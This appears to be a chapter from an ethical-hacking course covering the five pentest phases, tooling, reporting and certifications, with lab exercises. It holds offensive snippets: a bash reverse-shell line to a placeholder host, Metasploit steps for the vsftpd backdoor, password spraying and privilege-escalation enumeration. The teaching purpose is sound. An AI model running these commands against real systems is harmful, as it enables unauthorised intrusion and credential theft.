# Path 09 — Ethical Hacking

> **Level:** Intermediate → Advanced · **Lessons:** 8 · **Assumed knowledge:** Paths 01–08.

You now have the pieces — networks, Linux, Python, web, protocols, tools. This path stitches them into a **professional methodology**: how a pentester actually works, in the order they work, from "here's the target" to "here's the report." We'll walk the classic **five phases** of ethical hacking — reconnaissance, scanning, exploitation, post-exploitation, and reporting — and end with the certifications and career map for people who want to make this their job.

**The golden rule is bigger here than anywhere.** Every technique in this path is powerful and legal *only* when you have permission. Every hands-on step below is done in your lab, on TryHackMe / Hack The Box, or on an authorised engagement.

---

## Lesson 9.1 — What ethical hacking really is

### Why this matters
Before the phases, we need the identity of the work — what an ethical hacker actually does, what makes them "ethical," and how their work fits into a real business. This lesson gives you the professional frame you'll operate inside.

### The definition, expanded
An **ethical hacker** — also called a **penetration tester** — is paid to attack systems *with permission*, in a controlled and documented way, so weaknesses can be found and fixed before criminals find them. Same skills as a criminal, opposite purpose.

Three things separate a professional from a criminal, and none of them is technical:

1. **Permission.** Always in writing, before you start (the "Rules of Engagement" document, or **RoE**).
2. **Scope.** A clear list of what you're allowed to test and what's off-limits.
3. **Reporting.** You disclose everything you find to the client, with clear steps to fix each finding.

That's it. Same tools, same mind — but the ethical hacker was *invited*, stays inside a defined space, and hands back knowledge instead of exploiting it.

### The main flavours of engagement
Real engagements come in shapes with different objectives:

- **Vulnerability assessment.** Broad, mostly automated: find as many weaknesses as possible. No deep exploitation. Great for compliance.
- **Penetration test.** Focused, hands-on, and *exploits* real weaknesses to prove impact. This is what "pentest" usually means.
- **Red team engagement.** Long-term (weeks or months), goal-oriented ("gain domain admin, exfiltrate the CEO's mailbox"), and emulates a specific real-world adversary. Also tests the *defenders* — a red team teaches a blue team.
- **Purple team.** Red team + blue team working *together* in real time, sharing findings as they go. Fastest way to improve defences.

### Black, grey, or white box?
When engagements start, testers get different amounts of information about the target:

- **Black box** — you know nothing but the target's name/URL. Realistic to how a real attacker starts.
- **Grey box** — you get some info: credentials for a low-privileged account, an API doc, or a network diagram. Balances realism with efficiency.
- **White box** — you get everything: source code, architecture diagrams, admin access. Fastest way to find the most bugs.

Choice depends on the client's goal. White-box finds the most; black-box is closest to real life.

### 🚩 Challenge
Which type of engagement lasts weeks or months, has a specific goal like "reach domain admin," and emulates a particular adversary?

<details><summary>Answer</summary>A red team engagement.</details>

### Key terms
- **Penetration tester / ethical hacker** — the professional attacker with permission.
- **Rules of Engagement (RoE)** — the written authorisation and rules for a test.
- **Vulnerability assessment / penetration test / red team / purple team** — engagement flavours.
- **Black / grey / white box** — how much info the tester starts with.

### Recap
- Ethical hacking = same skills as a criminal, but with permission, scope, and reporting.
- Engagements range from broad vuln assessments to focused pentests to long red team ops.
- Black, grey, and white box describe how much information the tester starts with.

---

## Lesson 9.2 — The 5 phases of a penetration test

### Why this matters
Every serious methodology — CEH, PTES, OSSTMM, NIST 800-115 — reduces to roughly the same **five phases**. Learn this shape and you can slot every tool and technique you know into the right stage. This is the professional's mental workflow.

### The five phases at a glance
1. **Reconnaissance** — gather information about the target *before* touching anything sensitive.
2. **Scanning & enumeration** — actively probe to find live hosts, open ports, and running services.
3. **Gaining access (exploitation)** — use a weakness to get a foothold.
4. **Maintaining access (post-exploitation)** — keep the foothold, explore, escalate, and pivot.
5. **Analysis & reporting** — document everything, prove impact, hand over a report with fixes.

Some frameworks add a "covering tracks" step for red-team realism, but for most ethical work it's replaced by good documentation.

Two other frameworks worth knowing by name:
- **PTES** (Penetration Testing Execution Standard) — expands the phases into a detailed formal process.
- **NIST SP 800-115** — the US government's official pentesting guide, often required for regulated industries.
- **MITRE ATT&CK** — already covered in Path 06; it maps *techniques* to phases and is invaluable for red teams.

### The mindset shift as you move through the phases
- Phase 1 is *patient reading and searching*.
- Phase 2 is *systematic probing*.
- Phase 3 is *creative attacking*.
- Phase 4 is *disciplined exploration*.
- Phase 5 is *clear writing*.

Beginners often want to jump straight to phase 3. Professionals earn their reputation with phases 1, 2, and 5. **The best exploit in the world is worthless if you can't reproduce it or communicate it.**

### 🚩 Challenge
Which of the five phases is *most* about disciplined exploration and pivoting after you've gained access?

<details><summary>Answer</summary>Maintaining access / post-exploitation (phase 4).</details>

### Key terms
- **Phases 1–5** — Recon → Scan → Exploit → Post-exploit → Report.
- **PTES / NIST 800-115** — formal methodologies that expand these phases.

### Recap
- Every methodology maps to roughly five phases.
- Recon and reporting are as important as the exploit itself.
- The mindset changes each phase — patient, systematic, creative, disciplined, clear.

---

## Lesson 9.3 — Phase 1: Reconnaissance

### Why this matters
Recon is 80% of the game. Great hackers are great because they know the target better than the defenders do. Reserve real time for it — every hour of recon saves ten hours later.

### Passive vs active
Two flavours, and knowing which you're doing keeps you legal:

- **Passive recon** — gather information *without touching the target's systems*. Public sources only: search engines, certificate transparency logs, DNS records, social media, code repositories. Legal almost everywhere as long as you don't misuse what you find.
- **Active recon** — send actual traffic to the target. Legal only within scope.

Start passive. Move to active only when authorised.

### The techniques (a real toolkit)

**OSINT (Open-Source Intelligence)** — the umbrella name for gathering public info:

- **Google dorking** — advanced search operators to surface pages, files, or admin panels the owner probably didn't mean to expose:
  ```
  site:target.com filetype:pdf
  site:target.com inurl:admin
  intitle:"index of" site:target.com
  ```
- **Certificate transparency** — every HTTPS certificate ever issued is public; searching sites like `crt.sh` reveals subdomains you'd never guess.
- **Wayback Machine (`web.archive.org`)** — old versions of a site, often exposing endpoints since removed.
- **Shodan (`shodan.io`)** — a search engine for internet-connected devices. Powerful for finding exposed services.
- **GitHub** — companies leak secrets in public repos more than you'd believe. Search for their name plus terms like `password`, `API_KEY`, `.env`.
- **LinkedIn** — org charts, tech stacks (from job descriptions), and phishing targets.
- **DNS records** — MX, TXT, and NS records reveal mail providers, verification tokens, and DNS setups.

**Command-line recon:**
```bash
# subdomains from public sources
subfinder -d target.com -silent > subs.txt

# check which subdomains are alive and their tech
cat subs.txt | httpx -silent -status-code -title -tech-detect

# discover paths on a live host
ffuf -u https://api.target.com/FUZZ -w /usr/share/wordlists/common.txt -mc 200,301,403

# pull URLs from historical archives
gau target.com > urls.txt
```

**People and processes** — a real recon phase includes *humans*: who works there, in what teams, and what public communications reveal about the company's structure. Attackers use this to shape phishing campaigns; ethical hackers do the same to test resilience.

### The `recon-ng` framework
`recon-ng` (installed on Kali) is a modular framework that automates a huge amount of OSINT. If you'll do this work often, learn it — it's the pentester's answer to "record every source I checked."

### Time-boxing recon
Recon has no natural end — you could keep pulling threads forever. Time-box it: on a one-week engagement, spend the first day-and-a-half on recon. On a bug bounty, budget a few hours per new program before jumping in. When time's up, move to phase 2.

### 🧪 Lab — Passive recon on yourself
1. Pick your own website or GitHub username. Google it with search operators.
2. Check `crt.sh` for any of your subdomains (if you own a domain).
3. Look at `web.archive.org` — has your site been archived?
4. Search GitHub for your name + `password`. Anything embarrassing?
5. Write a mini "OSINT report on myself" in your notes. This is exactly what a hacker or a recruiter would gather about you.

### 🚩 Challenge
What free public database lets you find subdomains via all TLS certificates ever issued for a domain?

<details><summary>Answer</summary>Certificate transparency logs — searchable at crt.sh.</details>

### Key terms
- **OSINT** — open-source intelligence.
- **Google dorking** — advanced search operators.
- **Certificate transparency (crt.sh)** — subdomain goldmine.
- **Shodan / Wayback / recon-ng** — the big supporting tools.

### Recap
- Passive recon is safe and legal; active recon is only for in-scope work.
- Use OSINT: dorks, cert transparency, Shodan, GitHub, LinkedIn.
- Combine with `subfinder`/`httpx`/`ffuf` on the command line.
- Time-box recon — the hard part is *stopping*, not starting.

---

## Lesson 9.4 — Phase 2: Scanning & enumeration

### Why this matters
Recon shows you *what exists*; scanning tells you *what's exposed*. Enumeration is the deeper follow-up on each exposed service — "what version, what endpoints, what users?" — and it's where most footholds are actually found.

### Scanning: a review
You already know the workhorse tools from Path 08:
```bash
# Ping sweep — who's alive?
nmap -sn 192.168.1.0/24

# The everyday scan — versions + safe scripts
nmap -sV -sC -T4 -oN scan.txt target.example.com

# All ports (slower, but you never know)
nmap -p- -T4 target.example.com

# UDP too, for the top 20 common ones
sudo nmap -sU --top-ports 20 target.example.com
```

Read the output as a story. Every open port introduces a *service* to enumerate deeper in the next step.

### Enumeration by service
For each open port, ask three questions: *what is it, what version, what's known bad about that version?*

**Web (ports 80/443/8080/8443):**
```bash
whatweb https://target.com
nikto -h https://target.com                # legacy but useful known-issue check
gobuster dir -u https://target.com -w common.txt
```
Then move into browser-based recon and Burp (Path 07).

**SMB / Windows file sharing (445):**
```bash
enum4linux -a target
smbclient -L //target/  -N                 # list shares anonymously
```

**FTP (21):**
```bash
nmap --script ftp-anon target -p 21        # anonymous access allowed?
```

**SSH (22):**
```bash
ssh -v user@target                         # version banner tells you a lot
```

**Databases (3306 MySQL, 5432 Postgres, 1433 MSSQL, 27017 MongoDB):**
- Try default creds; look for `-anonymous` variants; check exposed replicas.

**SNMP (161/UDP):**
```bash
onesixtyone -c community.txt target
snmpwalk -v2c -c public target
```

Pointer: for **every** service, `searchsploit` maps versions to known exploits:
```bash
searchsploit apache 2.4
searchsploit vsftpd 2.3.4    # famous backdoor
```

### The mindset
Enumeration rewards patience. A dozen open ports means twelve mini-investigations. Don't skip because the port "looks boring" — a mundane service running a version with a known CVE is a foothold.

### Vulnerability scanners (with caution)
Tools like **OpenVAS / Greenbone**, **Nessus**, **Nexpose**, and **Qualys** automate a *lot* of enumeration and can flag known vulnerable versions. Good for large scopes; not a substitute for hands-on thinking. And in bug bounty: automated scanners are often banned — check the scope.

### 🧪 Lab — A full enum on a legal target
1. On a lab you own or a beginner TryHackMe / Hack The Box "starting point" machine, run `nmap -sV -sC -T4 -oN scan.txt` on the target.
2. For every open port, pick the right deeper tool from the list above and run it.
3. Note *everything* — banners, versions, response snippets — in your engagement notes.
4. Cross-check each version with `searchsploit`.

### 🚩 Challenge
For every open port a scan finds, what are the three questions to ask?

<details><summary>Answer</summary>What is it, what version, and what's known to be wrong with that version?</details>

### Key terms
- **Scanning vs enumeration** — what's exposed vs deep-diving each service.
- **searchsploit** — offline database of known exploits, matched by version.
- **enum4linux / nikto / gobuster / snmpwalk** — service-specific enum tools.

### Recap
- Nmap finds the ports; then enumerate each service in depth.
- Web, SMB, FTP, SSH, databases, and SNMP each have specific enum tools.
- Match every version to known exploits via `searchsploit`.
- Vuln scanners help but don't replace hands-on thinking; check bug bounty rules.

---

## Lesson 9.5 — Phase 3: Gaining access (exploitation)

### Why this matters
This is the phase everyone imagines when they picture hacking. The reality is less dramatic — most footholds come from unsexy things: default credentials, misconfigurations, known CVEs, and web bugs you already know from Path 07.

### The routes to a foothold
- **Known vulnerabilities (CVEs).** Enumeration turned up "vsftpd 2.3.4"? `searchsploit` gives you an exploit. Try it in your lab. On real engagements, use only for authorised scope.
- **Default or weak credentials.** Countless first footholds are `admin` / `admin` on a forgotten device.
- **Password spraying** — one common password (e.g., `Winter2024!`) tried against many accounts. Slow, quiet, and effective in real environments.
- **Web vulnerabilities** — SQL injection, RCE via file upload, or SSRF that reaches internal admin (Path 07). Web is *the* most common way in.
- **Social engineering / phishing** — sending a crafted email or link so a user gives you access. Whether this is allowed depends heavily on the RoE.
- **Insecure services** — anonymous FTP, exposed Redis without a password, misconfigured Kubernetes dashboards. Enumeration will show these.

### Metasploit — the framework you must know
**Metasploit** is a huge collection of exploits, payloads, and post-exploitation modules, all in one framework. On Kali:

```bash
msfconsole                                # start the framework

search vsftpd 2.3.4                       # find modules for a vulnerability
use exploit/unix/ftp/vsftpd_234_backdoor  # select the exploit
show options                              # see what to configure
set RHOSTS 10.10.10.5                     # set the target
run                                       # launch
```

Metasploit is great for learning — it structures exploitation cleanly and gives you a "meterpreter" shell after success with rich post-exploitation features. **Two cautions:** don't let it turn you into a "point-and-shoot" hacker — understand what each module does. And know that real detection systems catch stock Metasploit payloads very easily; in real red-team work you'll go beyond it.

### Payloads: what "gaining access" actually looks like
When an exploit lands, it typically drops you into one of two things:

- **A reverse shell** — the target connects out to your listener. Common when firewalls block incoming but allow outgoing.
  ```bash
  # on your machine
  nc -lnvp 4444              # netcat listener
  # payload gets the target to run:
  bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
  ```
- **A bind shell** — the target opens a port and waits; you connect in. Rarer today because outgoing firewalls block it less.

You'll practise both extensively in TryHackMe rooms and CTFs.

### The ethical part of phase 3
- **Never test exploits on production without a signed RoE covering that action.** Some are destructive.
- **Take snapshots before running destructive exploits** in your lab.
- **Log everything.** Every command run, every response received. This becomes the report and, if anything goes wrong, your professional defence.

### 🧪 Lab — Your first exploit (safely)
1. Deploy a **Metasploitable 2** VM (deliberately vulnerable, free) alongside your Kali. Isolate the network (Host-Only from Path 03).
2. From Kali, run `nmap -sV metasploitable-ip`. Find port 21 running `vsftpd 2.3.4`.
3. Look it up: `searchsploit vsftpd 2.3.4`.
4. In `msfconsole`, use the `vsftpd_234_backdoor` module, set `RHOSTS`, and run.
5. You should get a shell on the target. Run `whoami` — you'll be root.
6. Take a screenshot; write a short note explaining what happened, step by step. That's the seed of a real report.

### 🚩 Challenge
Which type of shell is more likely to work when the target's firewall blocks incoming connections — a reverse shell or a bind shell?

<details><summary>Answer</summary>A reverse shell — because the target connects out to your listener, so incoming firewall rules don't get in the way.</details>

### Key terms
- **CVE / exploit / payload** — a public vuln ID / the technique / what it delivers.
- **Metasploit / Metasploitable** — the famous framework / a deliberately vulnerable practice VM.
- **Reverse shell / bind shell** — target dials out to you / target waits for you.
- **Password spraying** — one password across many accounts.

### Recap
- Real footholds come mostly from known CVEs, defaults, web bugs, and social engineering.
- Metasploit is a superb learning framework (used with understanding).
- Reverse shells are the common practical payload today.
- Always work under a signed RoE; log everything.

---

## Lesson 9.6 — Phase 4: Post-exploitation (situational awareness, privesc, pivoting)

### Why this matters
Getting a shell is the beginning, not the end. **Post-exploitation** is where you find the real impact — the sensitive data, the domain admin, the pivot into another network. This phase separates junior testers from senior ones.

### Step A: Situational awareness — "where am I?"
The moment you land on a machine, you enumerate *the machine*. On Linux:
```bash
whoami
id
hostname
uname -a                     # OS and kernel version
ip a; ip route               # network setup
ps aux                       # what's running
netstat -tulpn               # what's listening
cat /etc/passwd              # user accounts
sudo -l                      # what CAN you already run as root?
history                      # what did previous users do?
ls -la ~ /root /home         # check for keys, notes, scripts
find / -perm -4000 2>/dev/null   # SUID binaries — classic privesc paths
```

Automated scripts do this in seconds:
- **LinPEAS** (Linux) — the community-standard privesc enumerator.
- **WinPEAS** (Windows).
- **PowerUp / SharpUp** — for Windows post-exploitation.
- **BloodHound** — maps Active Directory attack paths (see Path 11).

### Step B: Privilege escalation
Most footholds are as a low-privileged user. Escalating to **root (Linux) / SYSTEM or Domain Admin (Windows)** is the "big win." The classic paths:

- **Kernel exploits** — outdated kernels have public exploits. `uname -a` gives you the kernel; searchsploit gives you the exploit. Risky (may crash the box).
- **Sudo misconfigurations** — `sudo -l` reveals what you can run as root. A misconfigured entry can be a one-liner to root (e.g., `sudo vim /etc/hosts` → use vim's shell escape).
- **SUID binaries** — programs that run as their owner (often root). A vulnerable or misused SUID binary gives you root. `find / -perm -4000` lists them.
- **Cron jobs** — scheduled tasks running as root that you can influence (writable script, tampered path).
- **Weak file permissions** — `/etc/shadow` world-readable, private keys unprotected.
- **Password reuse** — the app's config file has database credentials; the database has admin's hashed password; you crack it and it's also the SSH password.

Windows adds: unquoted service paths, weak service permissions, DLL hijacking, token impersonation, and — the big one — **Active Directory attacks** (Kerberoasting, AS-REP roasting, delegation abuse). We cover AD in depth in Path 11.

### Step C: Pivoting
"Pivoting" means using one compromised machine to reach *another* network you couldn't reach before. Enterprise networks are usually segmented — a public web server on one segment, internal HR on another, invisible from outside. But *from* the web server, HR is reachable.

Techniques:
- **SSH tunnels** — `ssh -L 8080:internal-host:80 user@pivot`.
- **Metasploit's `route add` + proxychains** — route your Kali's traffic through your foothold.
- **`chisel`, `ligolo-ng`** — modern favourites for building tunnels on tough networks.

### Step D: Persistence (only when authorised!)
On a real red-team engagement, you may need to survive reboots or user password changes. Techniques include SSH keys, cron jobs, Windows scheduled tasks, and service backdoors. **This is destructive and detectable — only do it when the RoE explicitly allows it, and clean up before you leave.**

### The ethical part
Take screenshots and copy small proof files — never real customer data. If you exfiltrate anything, exfiltrate a *sample* or *hash* proving access, not the whole database. Every action goes in the log.

### 🚩 Challenge
You've landed a low-privileged shell on a Linux box. Name the single command that reveals what you can run *as root* right now.

<details><summary>Answer</summary>sudo -l</details>

### Key terms
- **Situational awareness** — mapping the compromised machine.
- **Privesc** — moving from a low user to root/admin.
- **LinPEAS / WinPEAS / BloodHound** — automated enumeration tools.
- **Pivoting** — using one foothold to reach unreachable networks.
- **Persistence** — surviving reboots (only under RoE).

### Recap
- Post-exploitation is where impact is proved and value is delivered.
- Step 1: enumerate the machine. Step 2: escalate. Step 3: pivot. Step 4 (rarely, and only with RoE): persist.
- Automated tools speed enum, but understand what they show.
- Prove access, don't abuse it. Screenshots and samples, never real data.

---

## Lesson 9.7 — Phase 5: Analysis & reporting

### Why this matters
The report is the *deliverable*. Everything else was preparation for it. A brilliant test with a bad report gets your client no fixes and gets you no repeat work. Reporting is a genuine skill — arguably the most valuable one on this list.

### What a professional report contains
A standard structure most clients expect:

1. **Executive summary** — one page in *plain English*, for non-technical leadership. What did we test? What did we find? How bad is it overall? What are the top three things to fix?
2. **Scope** — exactly what was in and out.
3. **Methodology** — high-level approach (kept short, e.g., "PTES-aligned, phases 1–5").
4. **Timeline** — when testing started and ended.
5. **Findings** — the meat. Each finding written up individually.
6. **Recommendations** — the "what to do" list, prioritised.
7. **Appendices** — raw output, screenshots, wordlists used.

### Anatomy of a single finding
Each finding follows a consistent template so readers can skim ten of them without getting lost:

- **Title** — vuln type + location. *"Stored XSS on /profile/bio"*.
- **Severity** — Critical / High / Medium / Low / Informational.
- **CVSS score** — the industry-standard 0–10 scoring (see below).
- **Summary** — one paragraph: what and where.
- **Impact** — what a real attacker could do. Business language: "an attacker could take over any user's account."
- **Steps to reproduce** — numbered, exact, copy-pasteable. This is where reports live or die.
- **Evidence** — a short screenshot or a redacted response snippet.
- **Remediation** — how to fix, referencing the relevant OWASP page or vendor doc.
- **References** — CVE numbers, OWASP links.

### CVSS — the standard severity language
The **Common Vulnerability Scoring System** (currently CVSS v3.1 / v4) scores a bug 0–10 across factors like attack vector, complexity, and impact on Confidentiality/Integrity/Availability. Roughly:

- 9.0–10.0 — Critical
- 7.0–8.9 — High
- 4.0–6.9 — Medium
- 0.1–3.9 — Low
- 0 — Informational

Use the free FIRST calculator (search "CVSS calculator") to score consistently. Overclaiming burns your credibility fast — a "critical" that's really a "low" damages your professional reputation more than one missing finding would.

### Writing style: for two audiences at once
Reports are read by both **engineers** (who need to reproduce and fix) and **executives** (who need to allocate money). Good reports serve both:

- **Executive-friendly** in the summary and impact sections. Avoid jargon. Say what's at risk in business terms.
- **Engineer-friendly** in the reproduction steps and remediation. Include exact requests, curl commands, screenshots.

### Retesting
After the client fixes the findings, you often retest — and produce a short **remediation report** confirming each finding is closed. This is often a paid follow-up and is where trust is truly built.

### 🧪 Lab — Write a report on your Metasploitable exploit
1. Take the vsftpd exploit you did in Lesson 9.5.
2. Write it up as if it were a real finding: title, severity, CVSS, summary, impact, reproduction steps, evidence, remediation, references.
3. Ask a friend (technical or not) to read it. Can they follow the reproduction steps? Can they explain the impact back to you? That test tells you if the report works.

Sample templates: search "SANS penetration testing report template" and "TCM Security pentest report template" — both are free and widely used.

### 🚩 Challenge
Which section of a pentest report is written in plain English for non-technical leadership?

<details><summary>Answer</summary>The executive summary.</details>

### Key terms
- **Report** — the deliverable.
- **Executive summary** — leadership-facing, plain-English overview.
- **CVSS** — the standard 0–10 severity scale.
- **Retest / remediation report** — verifying fixes after the client patches.

### Recap
- The report is the deliverable; everything else prepares for it.
- Serve two audiences — engineers and executives — with different sections.
- Standard structure: exec summary, scope, methodology, findings (each: title, severity, CVSS, summary, impact, reproduction, evidence, remediation, references).
- Retesting builds trust and repeat business.

---

## Lesson 9.8 — Your ethical hacking roadmap (certs, jobs, and how to grow)

### Why this matters
You now have the professional methodology and know how each phase feels. This lesson turns it into a plan for career growth — the certifications, communities, and habits that matter.

### Certifications, in a sensible order
Certs are not skills — but they are the standard way to *prove* skills and pass HR filters.

- **CompTIA Security+** — the entry-level, employer-friendly baseline. Wide, shallow, and often required for junior jobs. Excellent first cert.
- **eJPT (INE)** — the gentlest hands-on pentest cert. Realistic, affordable, no gatekeeping. Perfect after Path 09.
- **CEH (EC-Council)** — famous, sometimes required (especially for defence contractors), theory-heavy. Its practical version (CEH Practical) is much better.
- **PNPT (TCM Security)** — a very good practical cert with a real report requirement. Highly respected.
- **OSCP (Offensive Security)** — the classic hard practical cert. 24-hour exam plus a report. Widely known and respected, career-changing for many.
- **CPTS (Hack The Box)** — a strong modern alternative to OSCP, often praised as more realistic.
- **OSEP / OSED / OSWE** — advanced offensive certs after OSCP (evasion, exploit dev, web).
- **Blue-side:** BTL1, CySA+, SC-200 (Microsoft), Splunk Fundamentals — for defenders.

Rough path for a beginner aiming at pentest work: **Security+ → eJPT → PNPT or OSCP.** With this foundation and a portfolio of TryHackMe / HackTheBox writeups, you'll be genuinely employable.

### The portfolio matters more than the cert
Hiring managers value seeing you *work*. Build:

- A **GitHub** with your scripts, notes, and CTF writeups.
- A **blog** on Medium or your own site with clean writeups of TryHackMe / HTB machines and things you've learned.
- A **HackTheBox profile** showing solved machines.
- A **bug bounty profile** with any valid submissions (Path 10 next).

Three good writeups will get you more interviews than five certificates alone.

### The career map (with rough salary shape)
Roles you can realistically aim at within 2–3 years of steady work:

| Role | Description | Typical entry |
|---|---|---|
| **SOC Analyst L1** | Watch alerts, triage, escalate. | Security+ + notes |
| **Junior Pentester** | Assist on engagements. | eJPT + portfolio |
| **Application Security Analyst** | Review web apps, help devs. | Path 07 skills + reports |
| **Bug bounty hunter** | Independent, cash rewards. | Skills + patience |
| **Vulnerability Analyst** | Manage vuln scans, patching cadence. | Security+ + tools |

Senior roles (Senior Pentester, Red Teamer, Principal AppSec, Threat Hunter, SOC L3) tend to appear 3+ years in, and are where the salaries genuinely reward the work.

### Habits that keep you sharp
- **A monthly HTB or THM machine, written up publicly.** Compounds fast.
- **Follow good people on X/LinkedIn/YouTube:** for offensive, look at names like NahamSec, John Hammond, IppSec, and TCM. For defensive, Splunk education content, MalwareTech, DFIR.training.
- **Attend / stream a conference a year:** DEF CON talks are all on YouTube. Free knowledge from the field's best.
- **Read the OWASP Testing Guide** cover to cover in your first year.
- **Reproduce every real breach you read about** in your lab. Nothing teaches like reconstruction.

### Where next in the course
- **Path 10 — Bug Bounty:** turn what you know into a real (and possibly paid) applied practice.
- **Path 11 — Advanced Topics:** privesc deep dives, Active Directory, cloud, forensics.
- **Path 12 — AI & AI Security** (coming soon).

### 🚩 Challenge
For a beginner aiming to become a junior pentester, which three certifications does this lesson recommend in order?

<details><summary>Answer</summary>Security+ → eJPT → PNPT (or OSCP).</details>

### Recap
- Certs prove skills; portfolios show them. Build both.
- Sensible pentest track: Security+ → eJPT → PNPT / OSCP.
- Roles range from SOC L1 to Senior Pentester / Red Team, with salaries growing over 2–5 years.
- Sharpen with monthly machines, community learning, and reproducing real breaches.

---

## You've finished Path 09 🎉

You now know the professional workflow of an ethical hacker: **recon → scan → exploit → post-exploit → report**, framed by RoE and delivered as a proper document. You've seen the tools at each phase, the mindset shift each stage demands, and the roadmap of certs and roles you can aim at.

**Next up → `10-bug-bounty.md`:** applying everything you know to real, live, invitation-based programs — the world of bug bounty, from choosing programs and going deep on recon, through report writing, to advanced hunting techniques. This is where security becomes something you can *practise for real* every day, on your own schedule.
